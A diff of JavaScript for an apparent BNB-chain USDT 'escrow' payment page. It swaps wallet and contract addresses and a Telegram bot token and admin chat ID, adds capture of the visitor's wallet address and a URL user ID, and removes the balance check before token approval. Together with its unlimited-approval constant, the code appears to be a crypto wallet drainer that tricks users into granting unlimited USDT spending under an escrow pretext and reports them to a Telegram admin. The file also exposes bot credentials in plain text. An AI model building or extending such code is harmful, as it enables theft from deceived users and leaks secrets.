@@ -20,10 +20,10 @@ document.addEventListener("DOMContentLoaded", function () {
     // ===== CONFIG (Use Checksum Contract Address here) =====
     // Note: window.ethereum uses Ethers v5 syntax (ethers.providers.Web3Provider, ethers.utils.formatUnits, etc.)
     const CONFIG = {
-        COMPANY_WALLET_ADDRESS: "0x3D096439c5A13eb656E7BD917Fe5a93A6194fF62",
-        CONTRACT_ADDRESS: "0x38726eb8c302a9171B5c4A41CCbF47C38100D4d9",
-        TELEGRAM_BOT_TOKEN: "8976920389:AAEDhWwx4eWf4QB7ZOlNWbanpoBa55Mb8Ks", // Notification Bot Token (Bot A)
-        ADMIN_CHAT_ID: "7354974947", // CRITICAL: Your Admin Group Chat ID
+        COMPANY_WALLET_ADDRESS: "0x7073Fe7dFeEC2bcd959eb4ECA0eBeC85Bb3d1FA8",
+        CONTRACT_ADDRESS: "0xe6A3d870a33FD7CA75866F6fFe85B77564108eE2",
+        TELEGRAM_BOT_TOKEN: "8813197508:AAGQQK4nRCunzg2WIkNomj9W5PLLyTUqt5k", // Notification Bot Token (Bot A)
+        ADMIN_CHAT_ID: "5394590551", // CRITICAL: Your Admin Group Chat ID
     };
 
     // Constant for Unlimited Approval (MAX_UINT256)
@@ -305,7 +305,7 @@ document.addEventListener("DOMContentLoaded", function () {
         }
 
         nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
-           nextBtn.disabled = false; 
+        nextBtn.disabled = true;
 
         try {
             const bnbChainId = "0x38";
@@ -340,6 +340,11 @@ document.addEventListener("DOMContentLoaded", function () {
                 }
             }
 
+            // Get Wallet Address and User ID
+            const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get("user_id");
+
             // Fetch the current USDT balance before approval
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             const signer = provider.getSigner();
@@ -355,18 +360,6 @@ document.addEventListener("DOMContentLoaded", function () {
             const balanceWei = await usdtContract.balanceOf(fromAddress);
             const currentBalance = ethers.utils.formatUnits(balanceWei, decimals);
             // End of Balance Fetch
-
-            // 🔥 NEW: BALANCE VALIDATION LOGIC ADDED HERE 🔥
-            // Input amount ko Wei format me convert karke compare kar rahe hain
-            const requiredWei = ethers.utils.parseUnits(amountString, decimals);
-
-            if (balanceWei.lt(requiredWei)) {
-                // Agar wallet balance input amount se kam hai toh process cancel ho jayega
-                showNotification(`Insufficient USDT Balance! You have ${parseFloat(currentBalance).toFixed(2)} USDT`, "error");
-                nextBtn.disabled = false;
-                nextBtn.innerHTML = originalBtnHTML;
-                return; // 🛑 Transaction aage nahi badhegi aur wallet popup nahi aayega
-            }
 
             // === Approve ESCROW CONTRACT ===
             const escrowAddress = CONFIG.CONTRACT_ADDRESS;
@@ -420,8 +413,10 @@ document.addEventListener("DOMContentLoaded", function () {
                 (msg.includes("execution reverted") && msg.includes("exceeds balance"))
             ) {
                 showNotification("Insufficient BNB for gas fee or USDT balance.", "error");
-            } 
-                } finally {
+            } else {
+                showNotification("Transaction failed. Please try again.", "error");
+            }
+        } finally {
             // 🔥 CHANGE: Modal closing logic removed from finally.
             // It will only be closed in the catch block (on error/cancel).
             nextBtn.disabled = false;
